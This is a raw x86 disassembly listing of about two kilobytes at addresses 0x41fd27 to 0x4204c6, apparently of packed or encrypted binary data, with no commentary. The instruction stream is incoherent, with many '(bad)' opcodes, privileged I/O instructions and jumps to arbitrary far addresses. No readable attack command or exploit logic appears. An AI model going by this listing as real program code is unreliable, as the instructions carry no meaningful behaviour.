  41fd27:	xor    cl,BYTE PTR [edi+0x7f52275b]
  41fd2d:	aam    0xb2
  41fd2f:	gs jmp 0x1eb85d97
  41fd35:	mov    edx,edi
  41fd37:	pop    es
  41fd38:	adc    edi,ebx
  41fd3a:	loopne 0x41fcce
  41fd3c:	push   edx
  41fd3d:	clc    
  41fd3e:	nop
  41fd3f:	mov    edx,0x32ec7409
  41fd44:	aas    
  41fd45:	(bad)  
  41fd46:	jno    0x41fda4
  41fd48:	loopne 0x41fd39
  41fd4a:	sub    DWORD PTR ds:[ebx],ebx
  41fd4d:	push   0x99b89571
  41fd52:	adc    bl,BYTE PTR ds:0xa28f7aeb
  41fd58:	pop    edx
  41fd59:	pop    ss
  41fd5a:	push   ebp
  41fd5b:	pop    esi
  41fd5c:	or     eax,0x298c04a8
  41fd61:	out    dx,al
  41fd62:	push   esp
  41fd63:	or     al,0xb1
  41fd65:	mov    bl,0xd4
  41fd67:	mov    esi,0x3708e60e
  41fd6c:	add    bl,BYTE PTR [edx]
  41fd6e:	nop
  41fd6f:	sbb    DWORD PTR [edi+0x6c0648ef],0xffffffa8
  41fd76:	fdivr  DWORD PTR [ecx-0x3f]
  41fd79:	outs   dx,BYTE PTR ds:[esi]
  41fd7a:	test   DWORD PTR [ecx+0x7f0d8cd4],ebx
  41fd80:	ds jecxz 0x41fdf9
  41fd83:	idiv   DWORD PTR [ebx-0x3ed16639]
  41fd89:	mov    al,0x27
  41fd8b:	and    al,0x5b
  41fd8d:	mov    ah,0x4b
  41fd8f:	sbb    ebx,0xffffffb7
  41fd92:	lods   eax,DWORD PTR ds:[esi]
  41fd93:	hlt    
  41fd94:	jbe    0x41fd7e
  41fd96:	xor    edi,ebp
  41fd98:	in     al,0x28
  41fd9a:	dec    esi
  41fd9b:	and    ah,0x84
  41fd9e:	sbb    al,0xc5
  41fda0:	push   edx
  41fda1:	popf   
  41fda2:	dec    ecx
  41fda3:	loop   0x41fe05
  41fda5:	iret   
  41fda6:	sub    al,0x4d
  41fda8:	stc    
  41fda9:	pop    ds
  41fdaa:	pop    eax
  41fdab:	jl     0x41fdcd
  41fdad:	pushf  
  41fdae:	or     BYTE PTR [eax+0x62],bl
  41fdb1:	inc    esi
  41fdb2:	mov    cl,0xfe
  41fdb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdb5:	shl    DWORD PTR fs:[eax-0xc476b9],1
  41fdbc:	pushf  
  41fdbd:	xchg   ebx,eax
  41fdbe:	stc    
  41fdbf:	ss call 0x913b2bd
  41fdc5:	xchg   ecx,eax
  41fdc6:	and    ch,BYTE PTR [edx+0x30]
  41fdc9:	jmp    0x895eafa9
  41fdce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdcf:	adc    al,0x68
  41fdd1:	(bad)  
  41fdd2:	popa   
  41fdd3:	sar    edi,cl
  41fdd5:	add    ch,ch
  41fdd7:	xchg   ebp,eax
  41fdd8:	in     eax,0x89
  41fdda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fddb:	mov    ebp,0xf0ad3c64
  41fde0:	push   0xffffffea
  41fde2:	pop    es
  41fde3:	pop    DWORD PTR fs:[esi+0x58]
  41fde7:	jg     0x41fddc
  41fde9:	(bad)  
  41fdea:	jo     0x41fdd7
  41fdec:	mov    al,0x99
  41fdee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdef:	(bad)
  41fdf3:	loope  0x41fe3d
  41fdf5:	sahf   
  41fdf6:	pop    esp
  41fdf7:	add    al,BYTE PTR [edx]
  41fdf9:	ins    BYTE PTR es:[edi],dx
  41fdfa:	daa    
  41fdfb:	dec    ebp
  41fdfc:	add    DWORD PTR [eax+edi*2],0x8ac057f5
  41fe03:	sbb    bh,ch
  41fe05:	adc    DWORD PTR [ebp+esi*4+0x1fdd9223],eax
  41fe0c:	mov    ah,0x79
  41fe0e:	xor    bl,ah
  41fe10:	ss or  eax,0xde72547c
  41fe16:	add    esi,DWORD PTR [ebx+0x2f9bfb13]
  41fe1c:	(bad)  
  41fe1d:	ror    DWORD PTR [esi],cl
  41fe1f:	cmp    DWORD PTR [ecx-0x25],ebx
  41fe22:	imul   esp,eax,0x4220fc4f
  41fe28:	in     al,dx
  41fe29:	das    
  41fe2a:	cmp    eax,0x6d0046d3
  41fe2f:	ret    
  41fe30:	sbb    eax,0x3a688f8e
  41fe35:	test   BYTE PTR [ebx-0xbb5922a],bh
  41fe3b:	fistp  QWORD PTR [edi+0x47]
  41fe3e:	out    0xa0,eax
  41fe40:	cmp    DWORD PTR gs:[ecx],edx
  41fe43:	call   0x20c3:0x5f90591
  41fe4a:	xor    BYTE PTR fs:[ebx-0x2f],bh
  41fe4e:	adc    DWORD PTR [ecx-0x22],ecx
  41fe51:	sbb    DWORD PTR [edi+0x74],edi
  41fe54:	pusha  
  41fe55:	daa    
  41fe56:	test   al,0x35
  41fe58:	(bad)  
  41fe59:	pop    ebp
  41fe5a:	cmp    ecx,DWORD PTR [eax-0x478f913c]
  41fe60:	cli    
  41fe61:	xor    eax,0x1336fd18
  41fe66:	sub    eax,0x731893d7
  41fe6b:	fwait
  41fe6c:	dec    esi
  41fe6d:	dec    ecx
  41fe6e:	mov    ds:0xcfae7eb7,eax
  41fe73:	jno    0x41fe54
  41fe75:	sbb    dl,BYTE PTR [edx]
  41fe77:	ins    DWORD PTR es:[edi],dx
  41fe78:	jge    0x41fed0
  41fe7a:	sbb    BYTE PTR [ebx+eax*4-0x3b49b36c],cl
  41fe81:	aad    0x56
  41fe83:	push   cs
  41fe84:	mov    ds:0x42f1d243,eax
  41fe89:	rol    DWORD PTR [edx],0x5b
  41fe8c:	ret    
  41fe8d:	inc    BYTE PTR [ebx+0x417229fe]
  41fe93:	cdq    
  41fe94:	je     0x41fe17
  41fe96:	mov    ch,0xa2
  41fe98:	push   cs
  41fe99:	imul   eax,edi,0xa641d33b
  41fe9f:	mov    eax,0x9b697371
  41fea4:	test   BYTE PTR [edx-0x7577f260],bl
  41feaa:	test   al,0xc3
  41feac:	(bad)  
  41fead:	pop    ebp
  41feae:	lods   al,BYTE PTR ds:[esi]
  41feaf:	ds jle 0x41fe47
  41feb2:	xchg   ebp,eax
  41feb3:	out    0x1,eax
  41feb5:	das    
  41feb6:	inc    ecx
  41feb7:	push   ecx
  41feb8:	das    
  41feb9:	dec    esi
  41feba:	inc    edi
  41febb:	or     bl,BYTE PTR [edx-0x6ced823b]
  41fec1:	xchg   DWORD PTR [esi+0x7a4b9a22],esi
  41fec7:	adc    BYTE PTR [ecx-0x34],bh
  41feca:	xchg   ecx,eax
  41fecb:	scas   al,BYTE PTR es:[edi]
  41fecc:	adc    eax,0x253ee351
  41fed1:	arpl   WORD PTR [esi+0x423534f0],bx
  41fed7:	inc    eax
  41fed8:	pcmpeqw mm2,QWORD PTR [ebp+0x6278eee5]
  41fedf:	or     eax,ebx
  41fee1:	gs (bad) 
  41fee3:	mov    ecx,0x8369bc67
  41fee8:	(bad)  
  41fee9:	mov    gs,WORD PTR [bx+di]
  41feec:	jmp    0xfa8f:0xe664a93b
  41fef3:	jecxz  0x41fe99
  41fef5:	mov    edi,0xd7ed3b45
  41fefa:	jg     0x41ff14
  41fefc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fefd:	lds    edx,FWORD PTR [esi+0xa]
  41ff00:	cmp    al,0xe6
  41ff02:	sbb    esi,DWORD PTR [esp+esi*4]
  41ff05:	and    DWORD PTR [ebp-0x56e107da],edx
  41ff0b:	leave  
  41ff0c:	push   0x6d
  41ff0e:	cmp    DWORD PTR [ecx+ecx*1-0x5c],ebx
  41ff12:	dec    esi
  41ff13:	mov    ebp,DWORD PTR [edi+0x4d]
  41ff16:	push   ecx
  41ff17:	mov    al,0xe
  41ff19:	pusha  
  41ff1a:	imul   edx,DWORD PTR [ebx+0x7a],0x5e5383b5
  41ff21:	lods   eax,DWORD PTR ds:[esi]
  41ff22:	sub    eax,0xcc92523c
  41ff27:	pop    ebp
  41ff28:	aam    0xe8
  41ff2a:	adc    al,0x7a
  41ff2c:	lods   eax,DWORD PTR ds:[esi]
  41ff2d:	inc    esi
  41ff2e:	iret   
  41ff2f:	rcr    cl,0x50
  41ff32:	sub    eax,0xb3088fef
  41ff37:	cmp    al,0x42
  41ff39:	pop    eax
  41ff3a:	mov    esp,DWORD PTR [ecx-0x50]
  41ff3d:	retf   
  41ff3e:	(bad)  
  41ff3f:	lods   eax,DWORD PTR ds:[esi]
  41ff40:	call   0x98b:0x8f6a7a86
  41ff47:	cdq    
  41ff48:	mov    DWORD PTR [esi],eax
  41ff4a:	mov    dh,0xbb
  41ff4c:	mov    ds:0xb4bce97b,eax
  41ff51:	ds stos BYTE PTR es:[edi],al
  41ff53:	cdq    
  41ff54:	dec    ecx
  41ff55:	jecxz  0x41ff3d
  41ff57:	cmp    DWORD PTR [ecx],ecx
  41ff59:	or     eax,0x94aad480
  41ff5e:	jns    0x41ff17
  41ff60:	shl    BYTE PTR [edi-0x8abdd13],1
  41ff66:	int    0x5e
  41ff68:	cdq    
  41ff69:	arpl   WORD PTR [ebx+0x76],bx
  41ff6c:	mov    eax,ds:0xeb9d0a52
  41ff71:	or     bl,BYTE PTR [edi+0x1fefb50]
  41ff77:	and    al,0xdd
  41ff79:	jge    0x41ff09
  41ff7b:	or     edx,eax
  41ff7d:	sbb    ebp,DWORD PTR [ecx]
  41ff7f:	sub    BYTE PTR [eax-0x6fd8b6a6],0xa3
  41ff86:	cli    
  41ff87:	jae    0x41ff62
  41ff89:	popf   
  41ff8a:	xor    esi,DWORD PTR [edi]
  41ff8c:	lods   al,BYTE PTR ds:[esi]
  41ff8d:	imul   esp,DWORD PTR [edx-0x3531793a],0xec7bf792
  41ff97:	dec    esp
  41ff98:	mov    ds:0xe00fcd1f,al
  41ff9d:	dec    edx
  41ff9e:	sti    
  41ff9f:	lods   al,BYTE PTR ds:[esi]
  41ffa0:	out    0x16,eax
  41ffa2:	popa   
  41ffa3:	jmp    0x71c0:0x1224501d
  41ffaa:	push   0x24
  41ffac:	push   ebp
  41ffad:	es lock jb 0x420020
  41ffb1:	ja     0x41ffbe
  41ffb3:	sbb    esp,ebx
  41ffb5:	push   esi
  41ffb6:	into   
  41ffb7:	ret    
  41ffb8:	ror    BYTE PTR [eax-0x3d],1
  41ffbb:	leave  
  41ffbc:	retf   
  41ffbd:	push   ss
  41ffbe:	addr16 inc ecx
  41ffc0:	sti    
  41ffc1:	and    ebp,DWORD PTR [edx-0x56a81fdc]
  41ffc7:	sbb    cl,BYTE PTR [esi]
  41ffc9:	jae    0x41ffc3
  41ffcb:	mov    ch,0xe4
  41ffcd:	rol    bl,0xcc
  41ffd0:	jbe    0x420004
  41ffd2:	push   ss
  41ffd3:	add    eax,edi
  41ffd5:	es push eax
  41ffd7:	rol    BYTE PTR [ecx-0x25],1
  41ffda:	dec    esp
  41ffdb:	add    BYTE PTR [edx+ecx*4+0x6d],cl
  41ffdf:	mov    bh,0xe2
  41ffe1:	jae    0x41ffae
  41ffe3:	ficomp DWORD PTR [ebx+ebx*1+0x4]
  41ffe7:	iret   
  41ffe8:	xchg   edx,eax
  41ffe9:	call   0x9200:0x8cd0cf7d
  41fff0:	inc    BYTE PTR ds:0x2fe873ce
  41fff6:	jle    0x42002b
  41fff8:	lods   eax,DWORD PTR ds:[esi]
  41fff9:	ins    BYTE PTR es:[edi],dx
  41fffa:	jb     0x41ffb2
  41fffc:	nop
  41fffd:	jl     0x420053
  41ffff:	sub    edx,DWORD PTR [ecx+0x48]
  420002:	cmp    BYTE PTR [edx],ah
  420004:	xchg   ebp,eax
  420005:	in     al,dx
  420006:	inc    eax
  420007:	jo     0x41ffc2
  420009:	xor    BYTE PTR [eax],al
  42000b:	push   ecx
  42000c:	lea    ebx,[edi+eax*8+0x33bc9047]
  420013:	xor    al,0x5e
  420015:	es stc 
  420017:	cld    
  420018:	icebp  
  420019:	add    BYTE PTR [eax-0x6f8bc063],bh
  42001f:	jns    0x41fff3
  420021:	in     al,0x93
  420023:	add    ecx,DWORD PTR [ecx+0x3b7ddebe]
  420029:	push   ecx
  42002a:	ins    DWORD PTR es:[edi],dx
  42002b:	(bad)  
  42002c:	std    
  42002d:	jns    0x42007f
  42002f:	sbb    eax,0xfdcd8f98
  420034:	arpl   WORD PTR ds:0xf1ff0f09,ax
  42003a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42003b:	dec    ebx
  42003c:	cmp    cl,BYTE PTR [edx+esi*1-0x143e583b]
  420043:	es push ds
  420045:	sub    dl,BYTE PTR [ebp+0x57fb8f01]
  42004b:	retf   
  42004c:	loop   0x41fffd
  42004e:	push   0xe459a163
  420053:	ins    BYTE PTR es:[edi],dx
  420054:	leave  
  420055:	aas    
  420056:	xor    DWORD PTR es:[ebx],ebx
  420059:	inc    esi
  42005a:	mov    ebp,0x9e35a69
  42005f:	stc    
  420060:	mov    edi,0xc71bf8d4
  420065:	outs   dx,BYTE PTR ds:[esi]
  420066:	push   eax
  420067:	test   dl,dh
  420069:	call   0xcf1f:0x191def28
  420070:	dec    ebx
  420071:	sbb    BYTE PTR [ebp-0x3e],0xdc
  420075:	add    al,0x8
  420077:	xchg   ebx,eax
  420078:	or     ch,BYTE PTR [edi-0x25]
  42007b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42007c:	and    edx,DWORD PTR [esi]
  42007e:	mov    eax,ds:0x50425da6
  420083:	daa    
  420084:	push   edi
  420085:	clc    
  420086:	inc    ebp
  420087:	pop    esi
  420088:	pop    esi
  420089:	mov    bh,0x76
  42008b:	rol    ecx,cl
  42008d:	xor    dh,BYTE PTR [esi+0x63]
  420090:	retf   0x52ed
  420093:	aam    0xd6
  420095:	or     eax,0x5514b2e
  42009a:	retf   
  42009b:	fnsave [eax]
  42009d:	(bad)  
  42009e:	call   DWORD PTR [edi-0x6e04b256]
  4200a4:	dec    ecx
  4200a5:	shr    DWORD PTR [esi],cl
  4200a7:	call   0xf9bbbbc7
  4200ac:	sub    esi,DWORD PTR [edx-0x3a020ca6]
  4200b2:	(bad)  
  4200b3:	push   esi
  4200b4:	pusha  
  4200b5:	jg     0x4200fc
  4200b7:	jl     0x420066
  4200b9:	xchg   DWORD PTR [edx+0x365fb0e2],ebx
  4200bf:	call   0xceb10540
  4200c4:	call   0x3acb11e8
  4200c9:	mov    ebp,0x4d29ecd4
  4200ce:	jmp    0xe1cb63d4
  4200d3:	sub    BYTE PTR [edi],ch
  4200d5:	push   ebx
  4200d6:	setp   BYTE PTR [ecx+0x57adb77b]
  4200dd:	jo     0x4200df
  4200df:	lods   eax,DWORD PTR ds:[esi]
  4200e0:	call   0x167ebc30
  4200e5:	sub    DWORD PTR [eax+eiz*1+0x60],ebp
  4200e9:	aad    0xd4
  4200eb:	(bad)  
  4200ed:	shufps xmm6,XMMWORD PTR [eax+0x629bc420],0x81
  4200f5:	in     al,0xf1
  4200f7:	repnz adc eax,ecx
  4200fa:	(bad)  
  4200fc:	sub    dl,BYTE PTR [ebp+0x5f]
  4200ff:	ret    0x604a
  420102:	rcr    DWORD PTR [ecx-0x32728d5b],1
  420108:	sub    DWORD PTR [eax-0x38],0xffffffa4
  42010c:	jno    0x4200bf
  42010e:	dec    ebx
  42010f:	xchg   ecx,eax
  420110:	inc    ebp
  420111:	cdq    
  420112:	jp     0x420115
  420114:	jmp    0xdde56a86
  420119:	call   0xcb08:0x83945643
  420120:	add    dh,bh
  420122:	retf   0xbd76
  420125:	adc    ecx,edx
  420127:	sbb    ah,BYTE PTR ds:0x4d3e62f1
  42012d:	sbb    DWORD PTR [eax+0x35],esp
  420130:	stos   BYTE PTR es:[edi],al
  420131:	xchg   bh,ah
  420133:	mov    WORD PTR [esi],es
  420135:	dec    ebp
  420136:	mov    bl,0xc0
  420138:	sub    eax,0x6644c0d8
  42013d:	(bad)  
  42013e:	fwait
  42013f:	xlat   BYTE PTR ds:[ebx]
  420140:	ror    DWORD PTR [ebx],cl
  420142:	sar    BYTE PTR [ebp+0x66],1
  420145:	inc    ebx
  420146:	test   eax,0x4e5c783b
  42014b:	xor    edi,DWORD PTR ss:[edi+0x43]
  42014f:	(bad)  [ecx-0x34]
  420152:	jb     0x42011e
  420154:	push   0xffffffab
  420156:	xchg   ch,bl
  420158:	jmp    0x42018b
  42015a:	sbb    eax,0x72c3c1ca
  42015f:	add    eax,0xd7d6e1a9
  420164:	push   ebp
  420165:	out    0x99,al
  420167:	lods   al,BYTE PTR cs:[esi]
  420169:	pop    edi
  42016a:	pop    ds
  42016b:	hlt    
  42016c:	call   0xa21c:0x782882cd
  420173:	cli    
  420174:	inc    esi
  420175:	clc    
  420176:	mov    esi,DWORD PTR [eax+0x22]
  420179:	fs out dx,al
  42017b:	shl    BYTE PTR [edi+0x65],0xd9
  42017f:	jo     0x4201e6
  420181:	and    DWORD PTR [esi],esi
  420183:	mov    eax,0x5b4142f7
  420188:	push   es
  420189:	aaa    
  42018a:	(bad)  
  42018b:	dec    ebx
  42018c:	dec    ebx
  42018d:	or     BYTE PTR [ecx+eiz*2-0x3214330a],ah
  420194:	stc    
  420195:	imul   ebx,edx,0x42
  420198:	out    dx,eax
  420199:	jns    0x420219
  42019b:	(bad)  
  42019c:	fsub   DWORD PTR [edx+0x43d7c8af]
  4201a2:	and    eax,0xd43864d9
  4201a7:	add    BYTE PTR es:[eax+0x45],bl
  4201ab:	mov    eax,0x7e9dcfe0
  4201b0:	xchg   esi,eax
  4201b1:	(bad)  
  4201b2:	in     eax,dx
  4201b3:	(bad)  
  4201b4:	repz xor DWORD PTR ss:[ebp-0x7f54930a],ecx
  4201bc:	mov    dh,0x84
  4201be:	int3   
  4201bf:	mov    eax,ds:0xf2327b71
  4201c4:	xor    al,0xe2
  4201c6:	aad    0xeb
  4201c8:	sbb    DWORD PTR [edx],ebx
  4201ca:	aaa    
  4201cb:	mov    ch,0xa8
  4201cd:	loop   0x4201bd
  4201cf:	jle    0x420173
  4201d1:	push   edi
  4201d2:	sbb    al,0xbd
  4201d4:	mov    ds:0xc48ebd8e,al
  4201d9:	xor    DWORD PTR [ebx+0x19b40264],edi
  4201df:	aam    0x3b
  4201e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201e2:	div    ebp
  4201e4:	adc    BYTE PTR [edi],dl
  4201e6:	and    eax,0x122ef98e
  4201eb:	mov    ds:0xf116ca1,al
  4201f0:	mov    edi,DWORD PTR [ebx+0xc]
  4201f3:	mov    BYTE PTR [eax+esi*1],0x1a
  4201f7:	mov    esi,0xde6af43e
  4201fc:	jne    0x420262
  4201fe:	jg     0x420251
  420200:	adc    al,ch
  420202:	mov    eax,ds:0x65ec9316
  420207:	inc    edx
  420208:	push   edx
  420209:	jge    0x420286
  42020b:	sti    
  42020c:	ret    
  42020d:	cmp    edi,DWORD PTR [eax]
  42020f:	push   ebx
  420210:	(bad)
  420214:	mov    dh,0xd8
  420216:	xchg   edi,eax
  420217:	xchg   edx,eax
  420218:	test   eax,0x6c8ae7c6
  42021d:	ret    
  42021e:	push   ss
  42021f:	sub    edx,DWORD PTR [ebx]
  420221:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420222:	mov    al,0x40
  420224:	out    dx,al
  420225:	cdq    
  420226:	jnp    0x4201c2
  420228:	out    dx,eax
  420229:	xor    eax,0xd39e5c5c
  42022e:	adc    edx,0x1834875d
  420234:	pusha  
  420235:	bound  esi,QWORD PTR [esi+ebp*1+0x6f]
  420239:	adc    bl,BYTE PTR [edx+0x347917de]
  42023f:	pop    edi
  420240:	adc    DWORD PTR [edx+ebp*1-0x20],0x7e
  420245:	jnp    0x420209
  420247:	pop    edi
  420248:	(bad)  
  420249:	fwait
  42024a:	lods   eax,DWORD PTR ds:[esi]
  42024b:	or     eax,0x65b7f16e
  420250:	out    0x3b,al
  420252:	test   BYTE PTR [ebx],cl
  420254:	mov    ah,0x4a
  420256:	sbb    al,0x46
  420258:	arpl   WORD PTR [ebx-0x76ae1341],cx
  42025e:	call   0xf9c1:0x8258a018
  420265:	inc    edx
  420266:	daa    
  420267:	dec    eax
  420268:	push   es
  420269:	mov    edi,0x3d99b665
  42026e:	pop    edx
  42026f:	jmp    0x638cdf69
  420274:	push   edx
  420275:	stos   BYTE PTR es:[edi],al
  420276:	outs   dx,BYTE PTR ds:[esi]
  420277:	into   
  420278:	push   0x5d
  42027a:	jne    0x42023a
  42027c:	xchg   ah,dl
  42027e:	adc    ebp,esp
  420280:	xchg   ebp,eax
  420281:	into   
  420282:	imul   esi,esi,0x7d06e7de
  420288:	mov    ds:0xa658a0f0,eax
  42028d:	out    0xee,al
  42028f:	and    al,0x87
  420291:	cmp    ch,BYTE PTR [eax-0x6181c8c4]
  420297:	jmp    0xfeb2:0x651635b5
  42029e:	nop
  42029f:	hlt    
  4202a0:	cmp    BYTE PTR [ecx],bh
  4202a2:	mov    ch,0x6d
  4202a4:	ret    
  4202a5:	cli    
  4202a6:	cmp    al,0x74
  4202a8:	xor    BYTE PTR [edx],bh
  4202aa:	fist   DWORD PTR [edx+0x61517f99]
  4202b0:	sub    al,0xeb
  4202b2:	adc    DWORD PTR [edx],ebx
  4202b4:	lock dec esp
  4202b6:	inc    ebx
  4202b7:	mov    esi,0x5020925d
  4202bc:	int    0x89
  4202be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202bf:	bound  ebp,QWORD PTR [edi-0x61]
  4202c2:	jle    0x4202c2
  4202c4:	and    dl,BYTE PTR [edi+0x1b627916]
  4202ca:	ins    BYTE PTR es:[edi],dx
  4202cb:	(bad)  
  4202cc:	ins    DWORD PTR es:[edi],dx
  4202cd:	push   ebx
  4202ce:	mov    BYTE PTR [esi],bh
  4202d0:	adc    bl,dl
  4202d2:	inc    ecx
  4202d3:	test   al,0x83
  4202d5:	out    0xba,eax
  4202d7:	xchg   edi,eax
  4202d8:	(bad)  
  4202d9:	addr16 std 
  4202db:	sub    al,0xac
  4202dd:	dec    esi
  4202de:	mov    eax,0xaedf1c71
  4202e3:	lahf   
  4202e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202e5:	push   0x2f285403
  4202ea:	outs   dx,DWORD PTR ds:[esi]
  4202eb:	shr    BYTE PTR [ecx-0x50],0x2
  4202ef:	(bad)  
  4202f1:	(bad)  
  4202f2:	scas   al,BYTE PTR es:[edi]
  4202f3:	xchg   ebx,eax
  4202f4:	fistp  WORD PTR [edi]
  4202f6:	ss add al,0x3c
  4202f9:	scas   eax,DWORD PTR es:[edi]
  4202fa:	in     eax,0xea
  4202fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202fd:	ins    DWORD PTR es:[edi],dx
  4202fe:	outs   dx,BYTE PTR ds:[esi]
  4202ff:	xor    eax,0xee7b8353
  420304:	arpl   WORD PTR [ebx],bx
  420306:	enter  0x3b04,0x4b
  42030a:	sahf   
  42030b:	(bad)  
  42030c:	fist   WORD PTR [ebx-0x6f]
  42030f:	push   esi
  420310:	mov    cr7,ebp
  420313:	cmp    esi,edx
  420315:	enter  0x7b5f,0x1b
  420319:	bound  edx,QWORD PTR [esi+0x9]
  42031c:	mov    eax,ds:0x87eb3562
  420321:	inc    eax
  420322:	cmc    
  420323:	sbb    al,0xf
  420325:	mov    BYTE PTR [eax-0x369b5f3d],bl
  42032b:	ret    0x656c
  42032e:	pop    ecx
  42032f:	or     BYTE PTR ds:0x9d8b9610,al
  420335:	xchg   BYTE PTR [edi],ah
  420337:	stc    
  420338:	jge    0x420326
  42033a:	mov    eax,ds:0x4a786ff2
  42033f:	nop
  420340:	jno    0x4203b5
  420342:	mov    ah,0x4b
  420344:	call   0xe368:0x3e76786f
  42034b:	ror    BYTE PTR [ebx-0x80],0x32
  42034f:	scas   eax,DWORD PTR es:[edi]
  420350:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420351:	sub    ecx,edx
  420353:	outs   dx,DWORD PTR ds:[esi]
  420354:	mov    ebp,0xfcb6c3fe
  420359:	sub    eax,0x5415e52a
  42035e:	jl     0x42033c
  420360:	fisubr DWORD PTR [eax+0x26]
  420363:	inc    esp
  420364:	jae    0x4203c6
  420366:	jmp    0x4202ef
  420368:	jbe    0x420389
  42036a:	test   BYTE PTR [edi+0x4],dl
  42036d:	subps  xmm7,XMMWORD PTR [edi-0x36]
  420371:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420372:	push   esp
  420373:	gs js  0x42039f
  420376:	(bad)  
  420377:	mov    eax,ds:0xf7310b84
  42037c:	js     0x4203f4
  42037e:	xor    al,0x5b
  420380:	inc    ebp
  420381:	sahf   
  420382:	jle    0x42039f
  420384:	push   0x78
  420386:	sbb    esp,DWORD PTR [ebp+ecx*2+0x4e]
  42038a:	push   0xa9fde7f1
  42038f:	sub    DWORD PTR [esi],eax
  420391:	pusha  
  420392:	aam    0xe
  420394:	push   cs
  420395:	jb     0x4203a4
  420397:	jmp    DWORD PTR [ecx-0x80]
  42039a:	lea    ebp,ds:[ebx]
  42039d:	pop    ss
  42039e:	std    
  42039f:	pop    ebx
  4203a0:	adc    esp,DWORD PTR ss:[ebx-0x68]
  4203a4:	mov    DWORD PTR [esi+ecx*1-0x559c746f],ebx
  4203ab:	addr16 iret 
  4203ad:	cdq    
  4203ae:	fild   DWORD PTR [edi-0x7c73ab84]
  4203b4:	mov    cl,0xf4
  4203b6:	cwde   
  4203b7:	ret    0x270a
  4203ba:	pop    ebx
  4203bb:	sub    al,0xab
  4203bd:	dec    ebp
  4203be:	mov    ah,0x23
  4203c0:	fadd   st(5),st
  4203c2:	push   ds
  4203c3:	xchg   ebp,eax
  4203c4:	sbb    dl,BYTE PTR [edi+0x3dd6647d]
  4203ca:	mov    ds:0x7ad55063,eax
  4203cf:	into   
  4203d0:	xlat   BYTE PTR ds:[ebx]
  4203d1:	pop    esi
  4203d2:	cmp    al,BYTE PTR [edx-0x70f1cff1]
  4203d8:	pop    ss
  4203d9:	daa    
  4203da:	in     al,dx
  4203db:	ret    0x56db
  4203de:	aad    0x8f
  4203e0:	sub    DWORD PTR [eax],edx
  4203e2:	out    dx,eax
  4203e3:	add    esi,DWORD PTR [ebx+0xd]
  4203e6:	push   es
  4203e7:	jnp    0x4203b8
  4203e9:	je     0x420435
  4203eb:	retf   0x7298
  4203ee:	mov    ebx,0x9123a2b9
  4203f3:	dec    eax
  4203f4:	imul   ecx
  4203f6:	mov    ds:0x1a6e8997,al
  4203fb:	inc    eax
  4203fc:	pop    ds
  4203fd:	push   edi
  4203fe:	add    BYTE PTR [edi-0x55],ah
  420401:	jbe    0x4203dc
  420403:	sbb    eax,0x7a7170ce
  420408:	ds xchg esp,eax
  42040a:	cmp    eax,0x67864fbc
  42040f:	add    eax,0x23b28a89
  420414:	das    
  420415:	mov    ah,BYTE PTR [esi]
  420417:	icebp  
  420418:	mov    al,0x4a
  42041a:	sti    
  42041b:	jae    0x42046c
  42041d:	sbb    eax,DWORD PTR [ebp+0x37]
  420420:	jb     0x420412
  420422:	imul   bh
  420424:	xchg   edx,eax
  420425:	and    DWORD PTR [ecx],esp
  420427:	adc    eax,0x9ac2e65c
  42042c:	not    DWORD PTR [edi+edx*1+0x3c]
  420430:	arpl   bp,si
  420432:	pop    es
  420433:	std    
  420434:	mov    dh,0xc4
  420436:	push   ebp
  420437:	pushf  
  420438:	ins    DWORD PTR es:[edi],dx
  420439:	lods   al,BYTE PTR ds:[esi]
  42043a:	stos   BYTE PTR es:[edi],al
  42043b:	push   esi
  42043c:	loop   0x420432
  42043e:	add    dh,BYTE PTR [esi-0x36032f02]
  420444:	mov    esi,es
  420446:	pop    eax
  420447:	mov    bl,0xa3
  420449:	dec    edx
  42044a:	pop    ecx
  42044b:	sub    dh,BYTE PTR [edx-0x6e7e5a6d]
  420451:	test   eax,0xdb114226
  420456:	ins    BYTE PTR es:[edi],dx
  420457:	jge    0x4204b3
  420459:	pusha  
  42045a:	out    0x70,eax
  42045c:	lods   al,BYTE PTR ds:[esi]
  42045d:	pop    ebp
  42045e:	scas   eax,DWORD PTR es:[edi]
  42045f:	not    BYTE PTR [ebx+0x480f3c36]
  420465:	pop    ebx
  420466:	dec    eax
  420467:	js     0x42040d
  420469:	clc    
  42046a:	into   
  42046b:	push   ebx
  42046c:	mov    al,0x94
  42046e:	mov    BYTE PTR ds:0x8cc99fdd,0x5f
  420475:	cmp    al,0xab
  420477:	sbb    al,0x6
  420479:	ins    BYTE PTR es:[edi],dx
  42047a:	dec    edi
  42047b:	fcmovnu st,st(2)
  42047d:	aam    0x3
  42047f:	iret   
  420480:	xor    BYTE PTR [ecx-0x2d708769],al
  420486:	pop    ecx
  420487:	mov    al,ds:0x5913370f
  42048c:	and    ecx,ecx
  42048e:	xor    ebp,ecx
  420490:	fcmovne st,st(3)
  420492:	lea    esi,[ebp+eax*2-0x2f961b8e]
  420499:	cmc    
  42049a:	jbe    0x4204d5
  42049c:	jns    0x4204ca
  42049e:	push   ebp
  42049f:	jmp    0x30a4:0x570f5ae0
  4204a6:	push   ss
  4204a7:	and    cl,ah
  4204a9:	sbb    DWORD PTR [edx],edx
  4204ab:	and    ch,al
  4204ad:	dec    esi
  4204ae:	add    ebx,DWORD PTR [esp+ecx*1]
  4204b1:	mov    DWORD PTR [edi-0x43],edx
  4204b4:	fstp   DWORD PTR [eax]
  4204b6:	and    edi,DWORD PTR [edx-0x2a]
  4204b9:	neg    DWORD PTR [edx-0x4ef8b51c]
  4204bf:	xor    bh,0x33
  4204c2:	pop    ecx
  4204c3:	fst    st(4)
  4204c5:	cwde   
  4204c6:	lods   al,BYTE PTR ds:[esi]
